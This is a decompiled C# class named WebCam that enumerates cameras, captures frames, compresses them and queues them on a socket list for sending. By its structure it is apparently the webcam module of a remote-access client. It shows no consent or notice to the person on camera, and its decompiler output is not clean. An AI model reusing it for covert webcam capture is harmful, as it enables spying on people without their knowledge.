namespace Chat
{
    using AForge.Video;
    using AForge.Video.DirectShow;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Collections;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Drawing;
    using System.Runtime.CompilerServices;
    using System.Threading;

    public class WebCam
    {
        private static List<WeakReference> __ENCList = new List<WeakReference>();
        [AccessedThroughProperty("WebcamSteream")]
        private VideoCaptureDevice _WebcamSteream;
        private int delaytimer;
        private FilterInfoCollection Driver;
        public bool Senderx;
        private Thread THread;
        public Bitmap Video;
        public short WebcamQuality;

        public WebCam()
        {
            __ENCAddToList(this);
            this.WebcamQuality = 50;
            this.delaytimer = 200;
            this.Senderx = false;
        }

        [DebuggerNonUserCode]
        private static void __ENCAddToList(object value)
        {
            List<WeakReference> list = __ENCList;
            lock (list)
            {
                if (__ENCList.Count == __ENCList.Capacity)
                {
                    int index = 0;
                    int num3 = __ENCList.Count - 1;
                    for (int i = 0; i <= num3; i++)
                    {
                        WeakReference reference = __ENCList[i];
                        if (reference.IsAlive)
                        {
                            if (i != index)
                            {
                                __ENCList[index] = __ENCList[i];
                            }
                            index++;
                        }
                    }
                    __ENCList.RemoveRange(index, __ENCList.Count - index);
                    __ENCList.Capacity = __ENCList.Count;
                }
                __ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
            }
        }

        public string GetDriver()
        {
            string str;
            try
            {
                string str2;
                IEnumerator enumerator;
                this.Driver = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                try
                {
                    enumerator = this.Driver.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        str2 = str2 + ((FilterInfo) enumerator.Current).get_Name() + "|!|";
                        Thread.Sleep(1);
                    }
                }
                finally
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                }
                str = str2;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                str = " ";
                ProjectData.ClearProjectError();
                return str;
                ProjectData.ClearProjectError();
            }
            return str;
        }

        private void send()
        {
            Size size;
        Label_0002:;
            try
            {
                size = new Size(this.Video.Width, this.Video.Height);
                Data item = new Data("We", null, CodecDesktop.ComprimiImmagineAndColor(this.Video, size, this.WebcamQuality));
                Socketss.listDataSendWebcam.Add(item);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Thread.Sleep(50);
                ProjectData.ClearProjectError();
                goto Label_0002;
                ProjectData.ClearProjectError();
            }
            while (true)
            {
                if (this.Senderx)
                {
                    size = new Size(this.Video.Width, this.Video.Height);
                    Data data2 = new Data("We", null, CodecDesktop.ComprimiImmagineAndColor(this.Video, size, this.WebcamQuality));
                    Socketss.listDataSendWebcam.Add(data2);
                    this.Senderx = false;
                }
                Thread.Sleep(50);
            }
        }

        public void StartWebcam(short Device)
        {
            try
            {
                this.WebcamSteream = new VideoCaptureDevice(this.Driver.get_Item(Device).get_MonikerString());
                this.WebcamSteream.Start();
                Thread.Sleep(50);
                this.THread = new Thread(new ThreadStart(this.send));
                this.THread.Start();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void StopWebcam()
        {
            try
            {
                this.THread.Abort();
                Socketss.listDataSendWebcam.Clear();
                this.WebcamSteream.SignalToStop();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void WebcamSteream_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            this.Video = (Bitmap) eventArgs.get_Frame().Clone();
            Thread.Sleep(5);
        }

        private VideoCaptureDevice WebcamSteream
        {
            [DebuggerNonUserCode]
            get
            {
                return this._WebcamSteream;
            }
            [MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode]
            set
            {
                NewFrameEventHandler handler = new NewFrameEventHandler(this, (IntPtr) this.WebcamSteream_NewFrame);
                if (this._WebcamSteream != null)
                {
                    this._WebcamSteream.remove_NewFrame(handler);
                }
                this._WebcamSteream = value;
                if (this._WebcamSteream != null)
                {
                    this._WebcamSteream.add_NewFrame(handler);
                }
            }
        }
    }
}

